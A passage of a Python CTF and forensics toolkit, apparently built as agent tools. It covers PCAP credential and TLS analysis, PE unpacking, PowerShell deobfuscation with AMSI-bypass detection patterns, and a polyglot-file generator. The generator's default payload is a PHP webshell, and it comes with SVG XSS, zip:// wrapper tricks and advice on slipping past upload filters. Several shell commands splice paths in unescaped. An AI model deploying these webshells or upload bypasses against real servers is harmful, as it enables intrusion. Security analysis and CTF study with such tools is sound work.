        out = _shell(f"node '{tmp}' 2>&1", timeout=60)
        try: os.remove(tmp)
        except: pass
        return out

    if operation == "deobfuscate_run":
        src = code or ""
        if not src and fp:
            try:
                with open(fp) as f: src = f.read()
            except Exception as ex:
                return f"Cannot read {fp}: {ex}"
        if not src:
            return "Provide code= or file_path="
        # Patch console to capture everything
        wrapper = f"""
const _logs = [];
const _orig = console.log.bind(console);
console.log = (...a) => {{ _logs.push(a.join(' ')); _orig(...a); }};
console.error = (...a) => {{ _logs.push('[ERR] '+a.join(' ')); }};
try {{
{src}
}} catch(e) {{
  console.error('Deobfuscation error:', e.message);
}}
// Print summary
process.stderr.write('\\n[deobfuscate] total outputs: ' + _logs.length + '\\n');
"""
        tmp = f"/tmp/deobf_{int(time.time())}.js"
        with open(tmp, "w") as f: f.write(wrapper)
        out = _shell(f"node --max-old-space-size=512 '{tmp}' 2>&1", timeout=timeout)
        try: os.remove(tmp)
        except: pass
        return out

    return "Operations: run, eval_snippet, heapsnapshot_grep, deobfuscate_run"


def tool_pcap_deep(pcap_path: str, operation: str = "summary",
                    key_path: str = "", output_dir: str = "",
                    filter_expr: str = "", keyword: str = "") -> str:
    """Deep PCAP analysis beyond basic HTTP.
    Ops: summary (protocol breakdown + stats), decrypt_export (RSA key → decrypt TLS → export all HTTP objects),
    dns_exfil (detect/reconstruct DNS tunneling), covert_channel (timing/ICMP/HTTP-header covert data),
    extract_streams (follow all TCP/UDP streams), ftp_extract (files from FTP),
    smtp_extract (emails from SMTP), credentials (extract plaintext creds from any protocol),
    strings_all (strings across all packets matching keyword)."""

    sp = _w2l(pcap_path) if (IS_WINDOWS and USE_WSL) else pcap_path
    kp = (_w2l(key_path) if (IS_WINDOWS and USE_WSL) else key_path) if key_path else ""
    od = output_dir or f"/tmp/pcap_deep_{int(time.time())}"

    if operation == "summary":
        return _shell(f"tshark -r '{sp}' -q -z io,phs 2>/dev/null | head -40 && "
                     f"echo '--- Endpoints ---' && "
                     f"tshark -r '{sp}' -q -z endpoints,ip 2>/dev/null | head -20 && "
                     f"echo '--- Conversations ---' && "
                     f"tshark -r '{sp}' -q -z conv,tcp 2>/dev/null | head -15",
                     timeout=30)

    if operation == "decrypt_export":
        if not kp:
            return "Provide key_path (RSA private key .pem/.key or NSS keylog file)"
        _shell(f"mkdir -p '{od}'")
        # tshark with RSA key for TLS decryption + HTTP object export
        # Detect if keylog or RSA private key
        is_keylog = _shell(f"head -1 '{kp}' 2>/dev/null", timeout=5)
        if "CLIENT_RANDOM" in is_keylog or "SERVER_HANDSHAKE" in is_keylog:
            key_opt = f"-o 'tls.keylog_file:{kp}'"
        else:
            # RSA private key — need IP:port mapping
            key_opt = f"-o 'tls.keys_list:0.0.0.0,0,data,{kp}'"
        result = _shell(f"tshark -r '{sp}' {key_opt} --export-objects 'http,{od}' 2>&1 | head -20 && "
                       f"echo '--- Exported files ---' && ls -la '{od}' && "
                       f"echo '--- String search in exported files ---' && "
                       f"strings '{od}'/* 2>/dev/null | grep -iE 'flag|ctf|pico|key|secret' | head -20",
                       timeout=60)
        # Also try SMB objects
        result += _shell(f"tshark -r '{sp}' {key_opt} --export-objects 'smb,{od}/smb' 2>/dev/null; "
                        f"tshark -r '{sp}' {key_opt} --export-objects 'imf,{od}/imf' 2>/dev/null; "
                        f"ls '{od}'/ 2>/dev/null",
                        timeout=30)
        return result

    if operation == "dns_exfil":
        code = f"""
import subprocess, re, base64
sp = {repr(sp)}
# Extract all DNS queries
r = subprocess.run(['tshark', '-r', sp, '-Y', 'dns.flags.response == 0',
                    '-T', 'fields', '-e', 'dns.qry.name'],
                   capture_output=True, text=True, timeout=30)
queries = [q.strip() for q in r.stdout.strip().split('\\n') if q.strip()]
print(f"DNS queries: {{len(queries)}}")

# Look for exfiltration patterns
# Pattern 1: hex-encoded subdomains (e.g., 6865780a.evil.com)
hex_parts = []
b64_parts = []
text_parts = []
for q in queries:
    parts = q.split('.')
    for p in parts[:-2]:  # skip TLD parts
        if re.match(r'^[0-9a-fA-F]{{4,}}$', p):
            hex_parts.append(p)
        elif re.match(r'^[A-Za-z0-9+/]{{4,}}={{0,2}}$', p) and len(p) % 4 == 0:
            b64_parts.append(p)
        elif re.match(r'^[A-Za-z0-9]{{6,}}$', p):
            text_parts.append(p)

print(f"\\nHex-encoded subdomains: {{len(hex_parts)}}")
if hex_parts:
    combined = ''.join(hex_parts)
    try:
        decoded = bytes.fromhex(combined).decode(errors='replace')
        print(f"Hex decoded: {{decoded[:200]}}")
    except: pass

print(f"\\nPossible base64 subdomains: {{len(b64_parts)}}")
if b64_parts:
    combined = ''.join(b64_parts)
    try:
        decoded = base64.b64decode(combined + '==').decode(errors='replace')
        print(f"B64 decoded: {{decoded[:200]}}")
    except: pass

print(f"\\nQuery sequence (first 30): {{' | '.join(queries[:30])}}")

# iodine/dnscat2 detection
if any('dnscat' in q.lower() for q in queries):
    print("\\n[!] dnscat2 protocol detected!")
if any(len(q.split('.')[0]) > 50 for q in queries):
    print("\\n[!] Long subdomain labels — likely DNS tunnel")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "covert_channel":
        code = f"""
import subprocess, re, collections
sp = {repr(sp)}

print("=== Timing channel analysis ===")
r = subprocess.run(['tshark', '-r', sp, '-T', 'fields',
                    '-e', 'frame.time_relative', '-e', 'ip.src', '-e', 'ip.len'],
                   capture_output=True, text=True, timeout=20)
times = []
for line in r.stdout.strip().split('\\n')[:500]:
    parts = line.split('\\t')
    if len(parts) >= 3:
        try: times.append((float(parts[0]), parts[1], int(parts[2])))
        except: pass

if times:
    intervals = [times[i][0]-times[i-1][0] for i in range(1, len(times))]
    short = sum(1 for t in intervals if t < 0.01)
    long_ = sum(1 for t in intervals if t > 0.1)
    print(f"  Short intervals (<10ms): {{short}}, Long (>100ms): {{long_}}")
    if short > 10 and long_ > 10:
        # Possible timing channel — classify as bits
        bits = ''.join('0' if t < 0.05 else '1' for t in intervals[:200])
        print(f"  Timing bits (threshold 50ms): {{bits[:80]}}")
        for i in range(0, len(bits)-7, 8):
            b = int(bits[i:i+8], 2)
            if 32 <= b <= 126: print(chr(b), end='')
        print()

print("\\n=== ICMP data channel ===")
r2 = subprocess.run(['tshark', '-r', sp, '-Y', 'icmp', '-T', 'fields',
                     '-e', 'icmp.data'],
                    capture_output=True, text=True, timeout=15)
icmp_data = [d.strip() for d in r2.stdout.strip().split('\\n') if d.strip() and d.strip() != 'Pad']
if icmp_data:
    print(f"  ICMP payloads: {{len(icmp_data)}}")
    combined = ''.join(icmp_data)
    try:
        decoded = bytes.fromhex(combined).decode(errors='replace')
        if any(32 <= ord(c) <= 126 for c in decoded[:20]):
            print(f"  ICMP data: {{decoded[:200]}}")
    except: pass

print("\\n=== HTTP header covert data ===")
r3 = subprocess.run(['tshark', '-r', sp, '-Y', 'http', '-T', 'fields',
                     '-e', 'http.request.full_uri', '-e', 'http.cookie',
                     '-e', 'http.user_agent', '-e', 'http.authorization'],
                    capture_output=True, text=True, timeout=15)
for line in r3.stdout.strip().split('\\n')[:20]:
    if line.strip(): print(f"  {{line[:120]}}")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "credentials":
        return _shell(f"tshark -r '{sp}' -Y 'ftp.request.command == \"PASS\" or http.authbasic or "
                     f"telnet.data or smtp.auth.password or pop.request or imap.request' "
                     f"-T fields -e ftp.request.arg -e http.authbasic -e telnet.data 2>/dev/null | head -30 && "
                     f"echo '--- HTTP Basic Auth ---' && "
                     f"tshark -r '{sp}' -Y http -T fields -e http.authorization 2>/dev/null | "
                     f"grep -v '^$' | head -10",
                     timeout=20)

    if operation == "extract_streams":
        _shell(f"mkdir -p '{od}'")
        return _shell(f"tshark -r '{sp}' -q -z follow,tcp,ascii,0 2>/dev/null | head -100 && "
                     f"echo '--- All TCP stream count ---' && "
                     f"tshark -r '{sp}' -T fields -e tcp.stream 2>/dev/null | sort -u | wc -l && "
                     f"echo '--- Follow stream 0 ---' && "
                     f"tshark -r '{sp}' -q -z follow,tcp,raw,0 2>/dev/null | head -60",
                     timeout=30)

    if operation == "ftp_extract":
        _shell(f"mkdir -p '{od}'")
        return _shell(f"tshark -r '{sp}' --export-objects 'ftp-data,{od}' 2>/dev/null && "
                     f"ls -la '{od}' && strings '{od}'/* 2>/dev/null | grep -iE 'flag|ctf|key' | head -20",
                     timeout=30)

    if operation == "smtp_extract":
        _shell(f"mkdir -p '{od}'")
        return _shell(f"tshark -r '{sp}' --export-objects 'imf,{od}' 2>/dev/null && "
                     f"ls -la '{od}' && cat '{od}'/* 2>/dev/null | head -100",
                     timeout=30)

    if operation == "strings_all":
        kw = keyword or "flag"
        return _shell(f"tshark -r '{sp}' -T fields -e data.data 2>/dev/null | "
                     f"xxd -r -p 2>/dev/null | strings | grep -i '{kw}' | head -30 && "
                     f"strings '{sp}' | grep -i '{kw}' | head -20",
                     timeout=20)

    return "Operations: summary, decrypt_export, dns_exfil, covert_channel, credentials, extract_streams, ftp_extract, smtp_extract, strings_all"


def tool_pe_analysis(binary_path: str, operation: str = "info",
                     resource_type: str = "", output_dir: str = "") -> str:
    """Windows PE (Portable Executable) analysis.
    Ops: info (headers, sections, imports, TLS), resources (list + extract via wrestool/7z),
    icons (extract ICO resources), strings (pefile + strings command),
    unpack (UPX/Themida/MPRESS detection and unpacking)."""

    sp = (_w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path) if binary_path else ""
    od = output_dir or f"/tmp/pe_out_{int(time.time())}"
    _shell(f"mkdir -p '{od}'")

    if operation == "info":
        code = f"""
try:
    import pefile
    pe = pefile.PE({repr(sp)}, fast_load=False)
    print("=== PE Header ===")
    print(f"Machine:     {{hex(pe.FILE_HEADER.Machine)}}")
    print(f"Subsystem:   {{pe.OPTIONAL_HEADER.Subsystem}}")
    print(f"ImageBase:   {{hex(pe.OPTIONAL_HEADER.ImageBase)}}")
    print(f"EntryPoint:  {{hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)}}")
    print(f"Timestamp:   {{pe.FILE_HEADER.TimeDateStamp}}")
    print("\\n=== Sections ===")
    for s in pe.sections:
        name = s.Name.rstrip(b'\\x00').decode(errors='replace')
        print(f"  {{name:<12}} VA={{hex(s.VirtualAddress)}} sz={{s.SizeOfRawData}} entropy={{s.get_entropy():.2f}}")
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        print("\\n=== Imports (first 30) ===")
        for entry in pe.DIRECTORY_ENTRY_IMPORT[:10]:
            dll = entry.dll.decode(errors='replace')
            funcs = [imp.name.decode(errors='replace') if imp.name else f'ord_{{imp.ordinal}}' for imp in entry.imports[:5]]
            print(f"  {{dll}}: {{', '.join(funcs)}}...")
    if hasattr(pe, 'DIRECTORY_ENTRY_TLS'):
        print("\\n[!] TLS callbacks detected")
    print("\\n=== Resources ===")
    if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
        def _r(d, depth=0):
            for e in d.entries:
                n = str(e.name) if e.name else pefile.RESOURCE_TYPE.get(e.id, str(e.id))
                if hasattr(e, 'directory'):
                    print(f"  {{'  '*depth}}[DIR] {{n}}")
                    _r(e.directory, depth+1)
                else:
                    d2 = e.data.struct
                    print(f"  {{'  '*depth}}{{n}} offset={{hex(d2.OffsetToData)}} size={{d2.Size}}")
        _r(pe.DIRECTORY_ENTRY_RESOURCE)
except ImportError:
    print("pefile not installed — pip install pefile")
except Exception as ex:
    print(f"Error: {{ex}}")
    import traceback; traceback.print_exc()
"""
        return tool_execute_python(code, timeout=20)

    if operation == "resources":
        result = _shell(f"wrestool -l '{sp}' 2>&1", timeout=10)
        if "not found" in result or "command not found" in result:
            # fallback: 7z
            result = _shell(f"7z l '{sp}' 2>&1 | head -40", timeout=10)
        else:
            _shell(f"wrestool -x --output='{od}' '{sp}' 2>&1")
            ls = _shell(f"ls -la '{od}' && strings '{od}'/* 2>/dev/null | grep -iE 'flag|ctf|key|secret' | head -20", timeout=10)
            result += f"\n\nExtracted to {od}:\n{ls}"
        return result

    if operation == "icons":
        out = _shell(f"wrestool -x -t 14 --output='{od}' '{sp}' 2>&1 && "
                     f"ls '{od}'/*.ico '{od}'/*.ICO 2>/dev/null && "
                     f"convert '{od}'/*.ico '{od}/icon_%d.png' 2>/dev/null && "
                     f"echo 'PNGs saved to {od}'", timeout=15)
        return out

    if operation == "strings":
        code = f"""
try:
    import pefile, re
    pe = pefile.PE({repr(sp)}, fast_load=False)
    strings_found = []
    for section in pe.sections:
        data = section.get_data()
        # Find printable ASCII runs ≥6 chars
        for m in re.finditer(rb'[ -~]{{6,}}', data):
            strings_found.append(m.group().decode(errors='replace'))
    # Also check resource section string table
    if hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE'):
        pass  # already covered by raw section scan
    interesting = [s for s in strings_found if any(kw in s.lower() for kw in ['flag','ctf','key','secret','password','token'])]
    print(f"Total strings: {{len(strings_found)}}, Interesting: {{len(interesting)}}")
    for s in interesting[:30]:
        print(f"  [*] {{s}}")
    print("\\n--- All strings (first 60) ---")
    for s in strings_found[:60]:
        print(f"  {{s}}")
except ImportError:
    import subprocess, re
    r = subprocess.run(['strings', {repr(sp)}], capture_output=True, text=True, timeout=15)
    interesting = [l for l in r.stdout.splitlines() if any(kw in l.lower() for kw in ['flag','ctf','key','secret'])]
    print("Interesting:"); [print(f"  {{l}}") for l in interesting[:20]]
    print("\\nAll strings (first 60):"); [print(f"  {{l}}") for l in r.stdout.splitlines()[:60]]
"""
        return tool_execute_python(code, timeout=20)

    if operation == "unpack":
        result = []
        # Detect packer via section names
        code = f"""
try:
    import pefile
    pe = pefile.PE({repr(sp)}, fast_load=False)
    section_names = [s.Name.rstrip(b'\\x00').decode(errors='replace') for s in pe.sections]
    print(f"Sections: {{section_names}}")
    packers = []
    if any('UPX' in n for n in section_names): packers.append('UPX')
    if any(n in ('themida','winlicense','.vmp0','.vmp1') for n in section_names): packers.append('Themida/VMProtect')
    if any('.MPRESS' in n for n in section_names): packers.append('MPRESS')
    entropies = [s.get_entropy() for s in pe.sections]
    if any(e > 7.0 for e in entropies): packers.append('High-entropy section (possible packing)')
    print(f"Detected packers: {{packers or ['None detected']}}")
except Exception as ex:
    print(f"pefile error: {{ex}}")
"""
        result.append(tool_execute_python(code, timeout=10))
        # Try upx -d
        out_bin = f"{od}/unpacked.exe"
        upx_out = _shell(f"upx -d '{sp}' -o '{out_bin}' 2>&1", timeout=20)
        result.append(f"\nUPX unpack attempt:\n{upx_out}")
        return "\n".join(result)

    return "Operations: info, resources, icons, strings, unpack"


def tool_polyglot_file(operation: str = "list", file_type_a: str = "gif",
                        file_type_b: str = "php", content: str = "<?php system($_GET['cmd']); ?>",
                        input_path: str = "", output_path: str = "") -> str:
    """Generate polyglot files that are simultaneously valid as two different formats.
    Bypasses file upload type checks. E.g. GIF+PHP, PNG+JS, PDF+HTML, ZIP+JAR."""

    POLYGLOT_CATALOG = {
        ("gif", "php"): {
            "desc": "GIF89a header + PHP code — passes GIF MIME check, executes as PHP",
            "note": "Upload as .php or .phtml; server must allow PHP execution",
        },
        ("png", "php"): {
            "desc": "PNG IDAT chunk with PHP code in Comment/Text chunk",
            "note": "Use exiftool or PIL to inject into Comment field",
        },
        ("pdf", "html"): {
            "desc": "PDF header + HTML body — opens as PDF but innerHTML is HTML",
            "note": "Useful for stored XSS via file serve endpoints",
        },
        ("zip", "jar"): {
            "desc": "ZIP == JAR — same format, useful for SSRF/deserialization",
            "note": "JAR manifest required at META-INF/MANIFEST.MF",
        },
        ("zip", "docx"): {
            "desc": "Valid DOCX (Office Open XML) is a ZIP — modify contents for XXE",
        },
        ("gif", "js"): {
            "desc": "GIF header that is also valid JS (comment or assignment)",
        },
        ("jpg", "php"): {
            "desc": "JPEG with PHP payload in EXIF/Comment field",
        },
        ("svg", "xss"): {
            "desc": "SVG with embedded JS for XSS via <script> or onload",
        },
        ("html", "php"): {
            "desc": "HTML file with PHP code in comment blocks",
        },
        ("zip", "php"): {
            "desc": "PHP Zip wrapper: can be read via zip://archive.jpg#shell.php",
        },
    }

    if operation == "list":
        lines = ["=== Polyglot file type catalog ===\n"]
        for (a, b), meta in POLYGLOT_CATALOG.items():
            lines.append(f"  {a}+{b}: {meta['desc']}")
            if "note" in meta: lines.append(f"      Note: {meta['note']}")
        lines.append("\nUsage: operation='generate', file_type_a='gif', file_type_b='php'")
        lines.append("       optionally: input_path=<existing image>, content=<payload>")
        return "\n".join(lines)

    if operation == "generate":
        fa, fb = file_type_a.lower(), file_type_b.lower()
        out = output_path or f"/tmp/polyglot_{fa}_{fb}_{int(time.time())}.{fa}"
        code_lines = []

        if (fa, fb) in [("gif", "php"), ("php", "gif")]:
            code_lines = [
                f"payload = {repr(content)}",
                f"out = {repr(out)}",
                "# GIF89a magic + PHP payload",
                "gif_header = b'GIF89a'",
                "# Minimal GIF: 1x1 pixel, transparent",
                "gif_data = bytes([",
                "  0x47,0x49,0x46,0x38,0x39,0x61,  # GIF89a",
                "  0x01,0x00,0x01,0x00,0x80,0x00,0x00,  # 1x1, GCT flag",
                "  0xFF,0xFF,0xFF,0x00,0x00,0x00,  # white, black palette",
                "  0x21,0xF9,0x04,0x00,0x00,0x00,0x00,0x00,  # GCE",
                "  0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,  # image desc",
                "  0x02,0x02,0x4C,0x01,0x00,0x3B  # image data + trailer",
                "])",
                "# Append PHP after GIF trailer (some servers only check magic)",
                "# OR inject into GIF comment block (0x21 0xFE)",
                "comment_payload = b'\\x21\\xFE' + bytes([len(payload.encode())]) + payload.encode() + b'\\x00'",
                "# Build: GIF header, then comment with PHP, then 1x1 image data",
                "gif_without_trailer = bytes([",
                "  0x47,0x49,0x46,0x38,0x39,0x61,",
                "  0x01,0x00,0x01,0x00,0x80,0x00,0x00,",
                "  0xFF,0xFF,0xFF,0x00,0x00,0x00",
                "])",
                "full = gif_without_trailer + comment_payload + bytes([",
                "  0x21,0xF9,0x04,0x00,0x00,0x00,0x00,0x00,",
                "  0x2C,0x00,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x00,",
                "  0x02,0x02,0x4C,0x01,0x00,0x3B",
                "])",
                "with open(out,'wb') as f: f.write(full)",
                "import subprocess",
                "verify = subprocess.run(['file', out], capture_output=True, text=True)",
                "print(f'Written: {out} ({len(full)} bytes)')",
                "print(f'file output: {verify.stdout.strip()}')",
                "print(f'PHP payload: {payload[:80]}')",
                "print('Upload as: shell.php, shell.php.gif, shell.phtml, shell.php5')",
                "print('Try: Content-Type: image/gif with .php extension')",
            ]

        elif (fa, fb) in [("jpg", "php"), ("jpeg", "php")]:
            if input_path:
                code_lines = [
                    f"import subprocess",
                    f"out = {repr(out.replace('.gif','.jpg'))}",
                    f"payload = {repr(content)}",
                    f"import shutil; shutil.copy({repr(input_path)}, out)",
                    f"# Inject via exiftool comment",
                    f"r = subprocess.run(['exiftool', f'-Comment={payload}', out],",
                    f"  capture_output=True, text=True)",
                    f"print(r.stdout or r.stderr)",
                    f"# Also try imagemagick IPTC injection",
                    f"r2 = subprocess.run(['convert', out, '-set', 'comment', payload, out],",
                    f"  capture_output=True, text=True)",
                    f"print('Done:', out)",
                ]
            else:
                code_lines = [
                    f"out = {repr(out.replace('.gif','.jpg'))}",
                    f"payload = {repr(content)}",
                    "# Minimal JPEG with PHP in comment (0xFF 0xFE)",
                    "jpeg_soi = bytes([0xFF,0xD8])  # SOI",
                    "comment = payload.encode()",
                    "comment_len = len(comment) + 2",
                    "jpeg_comment = bytes([0xFF,0xFE]) + comment_len.to_bytes(2,'big') + comment",
                    "# Minimal JFIF APP0 + 1x1 pixel image",
                    "jpeg_end = bytes([0xFF,0xD9])  # EOI",
                    "full = jpeg_soi + jpeg_comment + jpeg_end",
                    "with open(out,'wb') as f: f.write(full)",
                    "print(f'JPEG+PHP polyglot written: {out} ({len(full)} bytes)')",
                ]

        elif (fa, fb) in [("svg", "xss")]:
            svg_xss = f"""<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
<script>{content}</script>
<rect width="100" height="100" fill="blue"/>
</svg>"""
            code_lines = [
                f"out = {repr(out.replace('.gif','.svg'))}",
                f"svg = {repr(svg_xss)}",
                "with open(out,'w') as f: f.write(svg)",
                "print(f'SVG+XSS written: {out}')",
                "print('Upload with Content-Type: image/svg+xml')",
                "print('Or inject as <img src=x.svg> for stored XSS')",
            ]

        elif (fa, fb) in [("pdf", "html")]:
            pdf_html = (f"%PDF-1.4\n1 0 obj<</Type /Catalog /Pages 2 0 R>>endobj\n"
                        f"2 0 obj<</Type /Pages /Kids[3 0 R]/Count 1>>endobj\n"
                        f"3 0 obj<</Type /Page /MediaBox[0 0 612 792]>>endobj\n"
                        f"<html><body>{content}</body></html>\n"
                        f"xref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n"
                        f"0000000058 00000 n\n0000000115 00000 n\n"
                        f"trailer<</Size 4/Root 1 0 R>>\nstartxref\n173\n%%EOF")
            code_lines = [
                f"out = {repr(out.replace('.gif','.pdf'))}",
                f"content = {repr(pdf_html)}",
                "with open(out,'w') as f: f.write(content)",
                "print(f'PDF+HTML polyglot: {out}')",
                "print('Serve with Content-Type: application/pdf for PDF readers')",
                "print('Or text/html to render as HTML page')",
            ]

        elif (fa, fb) in [("zip", "php")]:
            code_lines = [
                f"import zipfile, io",
                f"out = {repr(out.replace('.gif','.zip'))}",
                f"shell_content = {repr(content)}",
                "buf = io.BytesIO()",
                "with zipfile.ZipFile(buf, 'w') as z:",
                "    z.writestr('shell.php', shell_content)",
                "data = buf.getvalue()",
                "with open(out, 'wb') as f: f.write(data)",
                "print(f'ZIP archive written: {out}')",
                "print(f'PHP zip:// wrapper usage:')",
                f"print(f'  ?file=zip://{out}%23shell.php')",
                "print('Or upload as image.jpg and reference via zip://')",
            ]

        else:
            # Generic: prepend magic bytes of file_type_a, append content for file_type_b
            magic = {
                "gif": b"GIF89a", "png": b"\x89PNG\r\n\x1a\n",
                "jpg": b"\xff\xd8\xff", "jpeg": b"\xff\xd8\xff",
                "pdf": b"%PDF-1.4", "zip": b"PK\x03\x04",
            }.get(fa, fa.encode())
            code_lines = [
                f"magic = {repr(magic)}",
                f"payload = {repr(content.encode() if isinstance(content,str) else content)}",
                f"out = {repr(out)}",
                "full = magic + b'\\n' + payload",
                "with open(out,'wb') as f: f.write(full)",
                "print(f'Generic polyglot {fa}+{fb}: {out} ({len(full)} bytes)')",
                "print('Note: this is a best-effort skeleton. May need manual adjustment')",
                "print('for strict format validators. Check with: file <output>')",
            ]

        return tool_execute_python("\n".join(code_lines), timeout=20)

    if operation == "check":
        if not input_path: return "Provide input_path to check"
        return _shell(f"file '{input_path}'; exiftool '{input_path}' 2>/dev/null | head -20; "
                      f"xxd '{input_path}' | head -6")

    return "Operations: list, generate, check"


def tool_powershell_deobf(script_path: str = "", script_content: str = "",
                           operation: str = "deobfuscate") -> str:
    """PowerShell deobfuscation and analysis.
    Ops: deobfuscate (layer-by-layer decode), amsi_detect (find AMSI bypass attempts),
    iex_extract (extract Invoke-Expression payloads), strings (extract all cleartext strings),
    run_safe (execute in constrained language mode), decode_chain (base64 + gzip + xor chains)."""

    src = script_content or ""
    if script_path:
        sp = _w2l(script_path) if (IS_WINDOWS and USE_WSL) else script_path
        try:
            src = open(sp).read()
        except:
            src = _shell(f"cat '{sp}' 2>/dev/null", timeout=5)

    if operation == "deobfuscate":
        code = f"""
import re, base64, zlib, binascii

script = {repr(src[:50000])}
layers = [("Original", script)]
current = script

# Layer 1: base64 decode
def try_b64(s):
    # Find all base64 blobs
    results = []
    for m in re.finditer(r'[A-Za-z0-9+/]{{40,}}={{0,2}}', s):
        try:
            decoded = base64.b64decode(m.group())
            # Check if UTF-16LE (common in PS)
            try:
                text = decoded.decode('utf-16-le')
                if len(text) > 10 and text.isprintable():
                    results.append(('b64+utf16le', text[:500]))
                    continue
            except: pass
            # Try UTF-8
            try:
                text = decoded.decode('utf-8')
                if len(text) > 10 and any(c.isalpha() for c in text):
                    results.append(('b64+utf8', text[:500]))
            except: pass
        except: pass
    return results

b64_results = try_b64(current)
if b64_results:
    print(f"=== Base64 decoded layers ({{len(b64_results)}}) ===")
    for kind, text in b64_results[:3]:
        print(f"[{{kind}}]: {{text[:300]}}")
        current = text

# Layer 2: gzip decompress
for m in re.finditer(r'[A-Za-z0-9+/]{{40,}}={{0,2}}', current):
    try:
        compressed = base64.b64decode(m.group())
        decompressed = zlib.decompress(compressed, -15)  # raw deflate
        print(f"\\n=== Gzip/deflate layer ===")
        print(decompressed.decode(errors='replace')[:500])
        current = decompressed.decode(errors='replace')
    except: pass

# Layer 3: string replacement / char code
if 'char' in current.lower() or '[char]' in current.lower():
    char_vals = re.findall(r'\\[char\\]\\s*(\\d+)', current, re.IGNORECASE)
    if char_vals:
        decoded = ''.join(chr(int(v)) for v in char_vals if int(v) < 128)
        print(f"\\n=== [char] decode: {{decoded[:300]}}")

# Layer 4: string join / concatenation
join_m = re.search(r"-join\\s*['\"]([^'\"]+)['\"]", current, re.IGNORECASE)
if join_m:
    print(f"\\n=== -join content: {{join_m.group(1)[:200]}}")

# Extract final IEX payload
iex = re.findall(r'(?:Invoke-Expression|iex)\\s*[\\(\\$].*', current, re.IGNORECASE)
for ix in iex[:3]:
    print(f"\\n=== IEX call: {{ix[:200]}}")

# Extract interesting strings
strings_found = re.findall(r"['\"]([^'\"{{}}]{{8,200}})['\"]", current)
interesting = [s for s in strings_found if any(kw in s.lower()
               for kw in ['http','flag','key','secret','pass','cmd','exec','download'])]
if interesting:
    print(f"\\n=== Interesting strings: {{interesting[:10]}}")
"""
        return tool_execute_python(code, timeout=15)

    if operation == "amsi_detect":
        code = f"""
import re
script = {repr(src[:50000])}
amsi_patterns = [
    r'amsi', r'AmsiScanBuffer', r'AmsiInitialize',
    r'[Rr]ef.*AmsiUtils', r'\\$a.*\\[ref\\].*amsi',
    r'Win32.*Amsi', r'amsiContext', r'amsiSession',
    r'Reflection.*Assembly.*Load.*amsi',
    r'\\[Byte\\[\\]\\]\\s*\\(\\s*0x',  # byte array patches
    r'VirtualProtect', r'WriteProcessMemory',
    r'SetWindowsHookEx.*amsi',
]
found = []
for p in amsi_patterns:
    if re.search(p, script, re.IGNORECASE):
        found.append(p)
        for m in re.finditer(p, script, re.IGNORECASE):
            start = max(0, m.start()-50)
            print(f"[{{p}}]: {{script[start:m.end()+50]}}")
            break
if not found:
    print("No obvious AMSI bypass detected")
else:
    print(f"\\nAMSI bypass patterns found: {{found}}")
"""
        return tool_execute_python(code, timeout=10)

    if operation == "strings":
        code = f"""
import re
script = {repr(src[:50000])}
# Extract all string literals
strings = re.findall(r"['\"]([^'\"\\n]{{4,200}})['\"]", script)
# Deduplicate and filter
seen = set()
for s in strings:
    if s not in seen and not s.startswith('http://schemas') and not s.startswith('xmlns'):
        seen.add(s)
        print(s)
"""
        return tool_execute_python(code, timeout=10)

    if operation == "run_safe":
        if not src:
            return "Provide script_content or script_path"
        return _shell(f"pwsh -NonInteractive -NoProfile -ExecutionPolicy Bypass "
                     f"-Command \"$ExecutionContext.SessionState.LanguageMode = 'ConstrainedLanguage'; "
                     f"{src[:2000].replace(chr(34), chr(39))}\" 2>&1 | head -30 || "
                     f"powershell -NonInteractive -NoProfile -ExecutionPolicy Bypass "
                     f"-EncodedCommand {__import__('base64').b64encode(src[:2000].encode('utf-16-le')).decode()} "
                     f"2>&1 | head -30",
                     timeout=20)

    return "Operations: deobfuscate, amsi_detect, iex_extract, strings, run_safe, decode_chain"


def tool_pqc_attack(operation: str = "detect", **params) -> str:
    """Post-quantum crypto attacks: detect (weak params), lwe_attack (primal/dual reduction),
    ntru_attack (key recovery), kyber_fault (fault injection model), dilithium_nonce (biased signing)."""

    if operation == "detect":
        code = f"""
try:
    from sage.all import *
    n = {params.get('n', 0)}
    q = {params.get('q', 0)}
    if not (n and q):
        print("Provide n (dimension) and q (modulus) to detect weak params")
        print("\\nLWE parameter security heuristics:")
        print("  n<256, q<1024: likely breakable with lattice reduction")
        print("  q/n ratio < 8: high error rate, might be distinguishable")
        print("  q not prime: unusual, check for structure")
        print("  Gaussian width sigma: if sigma*sqrt(n) > q/4, decryption errors")
    else:
        print(f"n={{n}}, q={{q}}, log2(q)={{float(log(q,2)):.1f}}")
        # BKZ blocksize estimate for primal attack
        delta = (n * log(q) / (2 * n + n)) ** (1/(2*n))
        bkz_beta = round(float(0.2075 * log(q) * n))
        print(f"Estimated BKZ beta for primal attack: {{bkz_beta}}")
        if bkz_beta < 60:
            print("[!] WEAK: BKZ beta < 60 — breakable with standard LLL/BKZ")
        elif bkz_beta < 100:
            print("[!] MARGINAL: BKZ beta 60-100 — breakable with BKZ-2.0 + sieving")
        else:
            print(f"[OK] beta={{bkz_beta}} — appears secure against known lattice attacks")
        # Check for special structure
        if n & (n-1) == 0:
            print(f"[!] n={{n}} is power-of-2: NTT-friendly, check for ring-LWE vs plain LWE")
        if q % (2*n) == 1:
            print(f"[!] q ≡ 1 (mod 2n): NTT-compatible, Kyber/Dilithium-like structure")
except ImportError:
    print("SageMath not available. Manual checks:")
    n, q = {params.get('n',0)}, {params.get('q',0)}
    if n and q:
        import math
        print(f"n={n}, q={q}, log2(q)={math.log2(q):.1f}")
        print(f"n power-of-2: {n & (n-1) == 0}")
        print(f"q % (2n) == 1: {q % (2*n) == 1 if n else 'N/A'}")
"""
        return tool_execute_python(code, timeout=20)

    if operation == "lwe_attack":
        n = params.get('n', 0); q = params.get('q', 0)
        samples = params.get('samples', [])  # list of (a, b) pairs
        code = f"""
try:
    from sage.all import *
    n, q = {n}, {q}
    samples = {samples}
    if not samples:
        print("LWE attack templates (provide samples=[(a_vector, b_scalar), ...])")
        print()
